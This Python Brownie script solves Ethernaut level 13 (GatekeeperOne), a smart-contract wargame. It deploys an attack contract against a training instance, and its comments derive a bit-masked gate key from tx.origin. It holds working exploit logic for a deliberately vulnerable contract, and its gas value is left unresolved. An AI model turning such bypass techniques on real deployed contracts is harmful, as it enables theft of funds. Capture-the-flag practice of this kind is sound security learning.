from scripts.helpful_scripts import get_account
from brownie import web3, interface, Attack13


ETHERNAUT_INSTANCE = "0x7A711C2aF9dCeC0A59f3bB34EBD3A80A59d5d370"
PLAYER = "0xF8f8269488f73fab3935555FCDdD6035699deE25"
GAS_LIMIT = 6000000
# need to figure out exact gas amount to leave -> gasleft() % 8191 == 0
GAS_AMOUNT = 0

GATEKEY = "0xCDdD60350000eE25"


def main():

    player = get_account()
    attack = Attack13.deploy(ETHERNAUT_INSTANCE, {"from": player})
    attack.attack(GATEKEY, {"from": player})


# bytes    uint
#   1       8
#   2       16
#   4       32
#   8       64
#   16      128
#   20      160   <-- Ethereum address length (bytes20 <-> uint160)
#   32      256


# TX_ORIGIN = "0xF8f8269488f73fab3935555FCDdD6035699deE25"

# uint64(_gateKey) = gk
# uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
# uint32(uint64(_gateKey)) != uint64(_gateKey)
# uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))


#            160  128  64   32   16
# mask = "0x---- ---- ---- ---- ----"
# mask = "0xFFFF FFFF FFFF 0000 FFFF"


# -> PART-1
# uint32(gk) == uint16(gk)

# so: key = "0x---- ---- ---- 0000 ----"

# ->-> PART-2
# uint32(gk) != gk

# so: key = "0x---- ---- FFFF 0000 ----"


# ->->-> PART-3
# uint32(gk) == uint16(uint160(tx.orign))

# so: key = "0x---- ---- FFFF 0000 eE25"

# For bytes 13 to 20 we can simply pad with F:

# key = "0xFFFF FFFF FFFF 0000 eE25"
